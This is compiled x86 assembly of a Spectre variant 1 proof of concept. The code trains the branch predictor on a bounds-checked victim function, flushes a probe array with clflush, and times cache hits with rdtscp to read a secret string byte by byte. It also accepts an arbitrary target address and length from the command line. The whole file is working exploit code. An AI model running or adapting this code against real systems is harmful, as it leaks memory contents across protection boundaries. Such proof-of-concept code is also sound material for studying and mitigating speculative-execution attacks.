	.file	"spectre.c"
	.intel_syntax noprefix
	.text
	.p2align 4
	.globl	check
	.type	check, @function
check:
.LFB5562:
	.cfi_startproc
	call	__x86.get_pc_thunk.ax
	add	eax, OFFSET FLAT:_GLOBAL_OFFSET_TABLE_
	mov	eax, DWORD PTR array1_size@GOTOFF[eax]
	cmp	eax, DWORD PTR 4[esp]
	seta	al
	movzx	eax, al
	ret
	.cfi_endproc
.LFE5562:
	.size	check, .-check
	.p2align 4
	.globl	victim_function
	.type	victim_function, @function
victim_function:
.LFB5563:
	.cfi_startproc
	push	edi
	.cfi_def_cfa_offset 8
	.cfi_offset 7, -8
	push	esi
	.cfi_def_cfa_offset 12
	.cfi_offset 6, -12
	push	ebx
	.cfi_def_cfa_offset 16
	.cfi_offset 3, -16
	mov	eax, DWORD PTR 16[esp]
	call	__x86.get_pc_thunk.bx
	add	ebx, OFFSET FLAT:_GLOBAL_OFFSET_TABLE_
	mov	edx, DWORD PTR array1_size@GOTOFF[ebx]
	cmp	edx, eax
	jbe	.L3
	sub	eax, 1
	js	.L3
	lea	esi, array1@GOTOFF[ebx]
	movzx	ecx, BYTE PTR temp@GOTOFF[ebx]
	lea	edi, array2@GOTOFF[ebx]
	add	eax, esi
	.p2align 4,,10
	.p2align 3
.L5:
	movzx	edx, BYTE PTR [eax]
	sub	eax, 1
	sal	edx, 9
	and	cl, BYTE PTR [edi+edx]
	cmp	eax, esi
	jns	.L5
	mov	BYTE PTR temp@GOTOFF[ebx], cl
.L3:
	pop	ebx
	.cfi_restore 3
	.cfi_def_cfa_offset 12
	pop	esi
	.cfi_restore 6
	.cfi_def_cfa_offset 8
	pop	edi
	.cfi_restore 7
	.cfi_def_cfa_offset 4
	ret
	.cfi_endproc
.LFE5563:
	.size	victim_function, .-victim_function
	.p2align 4
	.globl	readMemoryByte
	.type	readMemoryByte, @function
readMemoryByte:
.LFB5564:
	.cfi_startproc
	push	ebp
	.cfi_def_cfa_offset 8
	.cfi_offset 5, -8
	mov	ecx, 256
	push	edi
	.cfi_def_cfa_offset 12
	.cfi_offset 7, -12
	push	esi
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	push	ebx
	.cfi_def_cfa_offset 20
	.cfi_offset 3, -20
	call	__x86.get_pc_thunk.bx
	add	ebx, OFFSET FLAT:_GLOBAL_OFFSET_TABLE_
	sub	esp, 76
	.cfi_def_cfa_offset 96
	mov	DWORD PTR 32[esp], ebx
	lea	edi, results@GOTOFF[ebx]
	mov	eax, DWORD PTR gs:20
	mov	DWORD PTR 60[esp], eax
	xor	eax, eax
	mov	DWORD PTR 40[esp], edi
	mov	DWORD PTR 52[esp], 0
	mov	DWORD PTR 28[esp], 999
	rep stosd
	lea	eax, array1_size@GOTOFF[ebx]
	mov	DWORD PTR 44[esp], eax
	lea	eax, 52[esp]
	mov	DWORD PTR 24[esp], eax
	lea	eax, array2@GOTOFF[ebx]
	mov	DWORD PTR 20[esp], eax
	lea	eax, array1@GOTOFF[ebx]
	mov	DWORD PTR 36[esp], eax
.L9:
	mov	edi, DWORD PTR 20[esp]
	mov	eax, edi
	lea	edx, 131072[edi]
	.p2align 4,,10
	.p2align 3
.L10:
	clflush	[eax]
	add	eax, 512
	cmp	edx, eax
	jne	.L10
	mov	eax, DWORD PTR 32[esp]
	mov	edi, DWORD PTR 96[esp]
	mov	ebp, -1431655765
	mov	ebx, DWORD PTR array1_size@GOTOFF[eax]
	mov	eax, DWORD PTR 28[esp]
	cdq
	idiv	ebx
	mov	ebx, 29
	mov	esi, ebx
	mov	ebx, DWORD PTR 44[esp]
	mov	DWORD PTR 16[esp], edx
	xor	edi, edx
	.p2align 4,,10
	.p2align 3
.L12:
	clflush	[ebx]
	mov	DWORD PTR 56[esp], 0
	mov	eax, DWORD PTR 56[esp]
	cmp	eax, 99
	jg	.L14
	.p2align 4,,10
	.p2align 3
.L11:
	mov	eax, DWORD PTR 56[esp]
	add	eax, 1
	mov	DWORD PTR 56[esp], eax
	mov	eax, DWORD PTR 56[esp]
	cmp	eax, 99
	jle	.L11
.L14:
	mov	eax, esi
	mul	ebp
	mov	eax, esi
	sub	esi, 1
	shr	edx, 2
	lea	edx, [edx+edx*2]
	add	edx, edx
	sub	eax, edx
	sub	eax, 1
	mov	edx, eax
	shr	eax, 16
	xor	dx, dx
	or	eax, edx
	and	eax, edi
	xor	eax, DWORD PTR 16[esp]
	push	eax
	.cfi_def_cfa_offset 100
	call	victim_function
	pop	eax
	.cfi_def_cfa_offset 96
	cmp	esi, -1
	jne	.L12
	mov	ebp, 13
	.p2align 4,,10
	.p2align 3
.L13:
	mov	eax, ebp
	movzx	ebx, al
	mov	eax, ebx
	sal	eax, 9
	mov	DWORD PTR 16[esp], eax
	rdtscp
	mov	edi, DWORD PTR 24[esp]
	mov	DWORD PTR 8[esp], eax
	mov	DWORD PTR 12[esp], edx
	mov	DWORD PTR [edi], ecx
	mov	esi, DWORD PTR 20[esp]
	mov	eax, DWORD PTR 16[esp]
	movzx	eax, BYTE PTR [esi+eax]
	rdtscp
	mov	DWORD PTR [edi], ecx
	sub	eax, DWORD PTR 8[esp]
	mov	ecx, 50
	mov	esi, eax
	sbb	edx, DWORD PTR 12[esp]
	xor	eax, eax
	cmp	ecx, esi
	sbb	eax, edx
	jc	.L15
	mov	eax, DWORD PTR 32[esp]
	mov	ecx, DWORD PTR array1_size@GOTOFF[eax]
	mov	eax, DWORD PTR 28[esp]
	cdq
	idiv	ecx
	mov	eax, DWORD PTR 36[esp]
	movzx	eax, BYTE PTR [eax+edx]
	cmp	eax, ebx
	je	.L15
	mov	eax, DWORD PTR 40[esp]
	add	DWORD PTR [eax+ebx*4], 1
.L15:
	add	ebp, 167
	cmp	ebp, 42765
	jne	.L13
	sub	DWORD PTR 28[esp], 1
	jne	.L9
	mov	edi, DWORD PTR 32[esp]
	mov	eax, DWORD PTR results@GOTOFF[edi]
	xor	eax, DWORD PTR 52[esp]
	mov	DWORD PTR results@GOTOFF[edi], eax
	mov	eax, DWORD PTR 60[esp]
	sub	eax, DWORD PTR gs:20
	jne	.L25
	add	esp, 76
	.cfi_remember_state
	.cfi_def_cfa_offset 20
	pop	ebx
	.cfi_restore 3
	.cfi_def_cfa_offset 16
	pop	esi
	.cfi_restore 6
	.cfi_def_cfa_offset 12
	pop	edi
	.cfi_restore 7
	.cfi_def_cfa_offset 8
	pop	ebp
	.cfi_restore 5
	.cfi_def_cfa_offset 4
	ret
.L25:
	.cfi_restore_state
	call	__stack_chk_fail_local
	.cfi_endproc
.LFE5564:
	.size	readMemoryByte, .-readMemoryByte
	.section	.rodata.str1.4,"aMS",@progbits,1
	.align 4
.LC0:
	.string	"Putting '%s' in memory, address %p\n"
	.section	.rodata.str1.1,"aMS",@progbits,1
.LC1:
	.string	"%p"
.LC2:
	.string	"%d"
	.section	.rodata.str1.4
	.align 4
.LC3:
	.string	"Trying malicious_x = %p, len = %d\n"
	.section	.rodata.str1.1
.LC4:
	.string	"Reading %d bytes:\n"
	.section	.rodata.str1.4
	.align 4
.LC5:
	.string	"Reading at malicious_x = %p secc= %c sec_ascii=%d ...\n"
	.section	.rodata.str1.1
.LC6:
	.string	"result[%d]=%d "
.LC7:
	.string	"\n"
.LC8:
	.string	"addr = %llx, pid = %d\n"
	.section	.text.startup,"ax",@progbits
	.p2align 4
	.globl	main
	.type	main, @function
main:
.LFB5565:
	.cfi_startproc
	call	__x86.get_pc_thunk.dx
	add	edx, OFFSET FLAT:_GLOBAL_OFFSET_TABLE_
	lea	ecx, 4[esp]
	.cfi_def_cfa 1, 0
	and	esp, -16
	push	DWORD PTR -4[ecx]
	mov	eax, ecx
	push	ebp
	mov	ebp, esp
	.cfi_escape 0x10,0x5,0x2,0x75,0
	push	edi
	push	esi
	push	ebx
	push	ecx
	.cfi_escape 0xf,0x3,0x75,0x70,0x6
	.cfi_escape 0x10,0x7,0x2,0x75,0x7c
	.cfi_escape 0x10,0x6,0x2,0x75,0x78
	.cfi_escape 0x10,0x3,0x2,0x75,0x74
	sub	esp, 104
	mov	eax, DWORD PTR 4[eax]
	mov	ecx, DWORD PTR [ecx]
	mov	DWORD PTR -64[ebp], edx
	mov	DWORD PTR -96[ebp], ecx
	mov	DWORD PTR -108[ebp], eax
	mov	eax, DWORD PTR gs:20
	mov	DWORD PTR -28[ebp], eax
	mov	eax, DWORD PTR stdin@GOT[edx]
	mov	DWORD PTR -72[ebp], eax
	lea	eax, check@GOTOFF[edx]
	mov	DWORD PTR -104[ebp], eax
	sar	eax, 31
	mov	DWORD PTR -100[ebp], eax
	.p2align 4,,10
	.p2align 3
.L27:
	mov	eax, DWORD PTR -72[ebp]
	sub	esp, 12
	mov	ebx, DWORD PTR -64[ebp]
	push	DWORD PTR [eax]
	call	getc@PLT
	add	esp, 16
	cmp	al, 114
	je	.L41
	cmp	al, 10
	je	.L27
	cmp	al, 105
	jne	.L35
	mov	ebx, DWORD PTR -64[ebp]
	call	getpid@PLT
	sub	esp, 12
	mov	edx, DWORD PTR -100[ebp]
	push	eax
	mov	eax, DWORD PTR -104[ebp]
	add	eax, 33
	adc	edx, 0
	push	edx
	push	eax
	lea	eax, .LC8@GOTOFF[ebx]
	push	eax
	push	1
	call	__printf_chk@PLT
	add	esp, 32
	jmp	.L27
.L41:
	mov	ebx, DWORD PTR -64[ebp]
	mov	eax, DWORD PTR secret@GOTOFF[ebx]
	lea	edi, array1@GOTOFF[ebx]
	push	eax
	push	eax
	lea	eax, .LC0@GOTOFF[ebx]
	push	eax
	push	1
	call	__printf_chk@PLT
	mov	eax, DWORD PTR secret@GOTOFF[ebx]
	mov	edx, eax
	mov	DWORD PTR [esp], eax
	sub	edx, edi
	mov	DWORD PTR -48[ebp], edx
	call	strlen@PLT
	add	esp, 12
	mov	DWORD PTR -44[ebp], eax
	mov	esi, eax
	lea	eax, array2@GOTOFF[ebx]
	push	131072
	push	1
	push	eax
	call	memset@PLT
	add	esp, 16
	cmp	DWORD PTR -96[ebp], 3
	je	.L42
.L29:
	mov	ebx, DWORD PTR -64[ebp]
	sub	esp, 4
	push	esi
	lea	eax, .LC4@GOTOFF[ebx]
	push	eax
	push	1
	call	__printf_chk@PLT
	mov	eax, DWORD PTR -44[ebp]
	add	esp, 16
	sub	eax, 1
	mov	DWORD PTR -44[ebp], eax
	test	eax, eax
	js	.L27
	lea	ecx, .LC5@GOTOFF[ebx]
	lea	eax, .LC6@GOTOFF[ebx]
	mov	DWORD PTR -68[ebp], 0
	mov	DWORD PTR -84[ebp], ecx
	lea	ecx, -40[ebp]
	mov	DWORD PTR -92[ebp], ecx
	lea	ecx, -30[ebp]
	mov	DWORD PTR -76[ebp], ecx
	lea	ecx, results@GOTOFF[ebx+4]
	mov	DWORD PTR -80[ebp], ecx
	lea	ecx, .LC7@GOTOFF[ebx]
	mov	DWORD PTR -88[ebp], ecx
	mov	DWORD PTR -60[ebp], eax
.L30:
	mov	ebx, DWORD PTR -64[ebp]
	mov	edi, DWORD PTR -68[ebp]
	sub	esp, 12
	mov	esi, 1
	mov	eax, DWORD PTR secret@GOTOFF[ebx]
	movsx	eax, BYTE PTR [eax+edi]
	add	edi, 1
	push	eax
	push	eax
	push	DWORD PTR -48[ebp]
	push	DWORD PTR -84[ebp]
	push	1
	call	__printf_chk@PLT
	mov	eax, DWORD PTR -48[ebp]
	add	esp, 28
	push	DWORD PTR -92[ebp]
	push	DWORD PTR -76[ebp]
	push	eax
	lea	edx, 1[eax]
	mov	DWORD PTR -68[ebp], edi
	mov	DWORD PTR -48[ebp], edx
	call	readMemoryByte
	mov	edi, DWORD PTR -80[ebp]
	add	esp, 16
	jmp	.L33
	.p2align 4,,10
	.p2align 3
.L32:
	add	esi, 1
	add	edi, 4
	cmp	esi, 256
	je	.L43
.L33:
	mov	eax, DWORD PTR -4[edi]
	mov	edx, DWORD PTR [edi]
	lea	ecx, -1[esi]
	cmp	eax, edx
	jle	.L32
	mov	ebx, eax
	sub	ebx, edx
	cmp	ebx, 100
	jle	.L32
	push	eax
	mov	ebx, DWORD PTR -64[ebp]
	add	edi, 4
	push	ecx
	push	DWORD PTR -60[ebp]
	push	1
	call	__printf_chk@PLT
	push	DWORD PTR -4[edi]
	push	esi
	add	esi, 1
	push	DWORD PTR -60[ebp]
	push	1
	call	__printf_chk@PLT
	add	esp, 32
	cmp	esi, 256
	jne	.L33
.L43:
	sub	esp, 8
	push	DWORD PTR -88[ebp]
	mov	ebx, DWORD PTR -64[ebp]
	push	1
	call	__printf_chk@PLT
	mov	eax, DWORD PTR -44[ebp]
	add	esp, 16
	sub	eax, 1
	mov	DWORD PTR -44[ebp], eax
	test	eax, eax
	jns	.L30
	jmp	.L27
.L35:
	mov	eax, DWORD PTR -28[ebp]
	sub	eax, DWORD PTR gs:20
	jne	.L44
	lea	esp, -16[ebp]
	xor	eax, eax
	pop	ecx
	.cfi_remember_state
	.cfi_restore 1
	.cfi_def_cfa 1, 0
	pop	ebx
	.cfi_restore 3
	pop	esi
	.cfi_restore 6
	pop	edi
	.cfi_restore 7
	pop	ebp
	.cfi_restore 5
	lea	esp, -4[ecx]
	.cfi_def_cfa 4, 4
	ret
.L42:
	.cfi_restore_state
	mov	ebx, DWORD PTR -64[ebp]
	mov	esi, DWORD PTR -108[ebp]
	push	eax
	lea	eax, -48[ebp]
	push	eax
	lea	eax, .LC1@GOTOFF[ebx]
	push	eax
	push	DWORD PTR 4[esi]
	call	__isoc99_sscanf@PLT
	add	esp, 12
	lea	eax, -44[ebp]
	sub	DWORD PTR -48[ebp], edi
	push	eax
	lea	eax, .LC2@GOTOFF[ebx]
	push	eax
	push	DWORD PTR 8[esi]
	call	__isoc99_sscanf@PLT
	lea	eax, .LC3@GOTOFF[ebx]
	push	DWORD PTR -44[ebp]
	push	DWORD PTR -48[ebp]
	push	eax
	push	1
	call	__printf_chk@PLT
	mov	esi, DWORD PTR -44[ebp]
	add	esp, 32
	jmp	.L29
.L44:
	call	__stack_chk_fail_local
	.cfi_endproc
.LFE5565:
	.size	main, .-main
	.local	results
	.comm	results,1024,32
	.globl	temp
	.bss
	.type	temp, @object
	.size	temp, 1
temp:
	.zero	1
	.globl	secret
	.section	.rodata.str1.4
	.align 4
.LC9:
	.string	"The Magic Words are Squeamish Ossifrage."
	.section	.data.rel.local,"aw"
	.align 4
	.type	secret, @object
	.size	secret, 4
secret:
	.long	.LC9
	.globl	array2
	.bss
	.align 32
	.type	array2, @object
	.size	array2, 131072
array2:
	.zero	131072
	.globl	unused2
	.align 32
	.type	unused2, @object
	.size	unused2, 64
unused2:
	.zero	64
	.globl	array1
	.data
	.align 32
	.type	array1, @object
	.size	array1, 160
array1:
	.string	"\001\002\003\004\005\006\007\b\t\n\013\f\r\016\017\020"
	.zero	143
	.globl	unused1
	.bss
	.align 32
	.type	unused1, @object
	.size	unused1, 64
unused1:
	.zero	64
	.globl	array1_size
	.data
	.align 4
	.type	array1_size, @object
	.size	array1_size, 4
array1_size:
	.long	16
	.section	.text.__x86.get_pc_thunk.ax,"axG",@progbits,__x86.get_pc_thunk.ax,comdat
	.globl	__x86.get_pc_thunk.ax
	.hidden	__x86.get_pc_thunk.ax
	.type	__x86.get_pc_thunk.ax, @function
__x86.get_pc_thunk.ax:
.LFB5566:
	.cfi_startproc
	mov	eax, DWORD PTR [esp]
	ret
	.cfi_endproc
.LFE5566:
	.section	.text.__x86.get_pc_thunk.dx,"axG",@progbits,__x86.get_pc_thunk.dx,comdat
	.globl	__x86.get_pc_thunk.dx
	.hidden	__x86.get_pc_thunk.dx
	.type	__x86.get_pc_thunk.dx, @function
__x86.get_pc_thunk.dx:
.LFB5567:
	.cfi_startproc
	mov	edx, DWORD PTR [esp]
	ret
	.cfi_endproc
.LFE5567:
	.section	.text.__x86.get_pc_thunk.bx,"axG",@progbits,__x86.get_pc_thunk.bx,comdat
	.globl	__x86.get_pc_thunk.bx
	.hidden	__x86.get_pc_thunk.bx
	.type	__x86.get_pc_thunk.bx, @function
__x86.get_pc_thunk.bx:
.LFB5568:
	.cfi_startproc
	mov	ebx, DWORD PTR [esp]
	ret
	.cfi_endproc
.LFE5568:
	.hidden	__stack_chk_fail_local
	.ident	"GCC: (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0"
	.section	.note.GNU-stack,"",@progbits
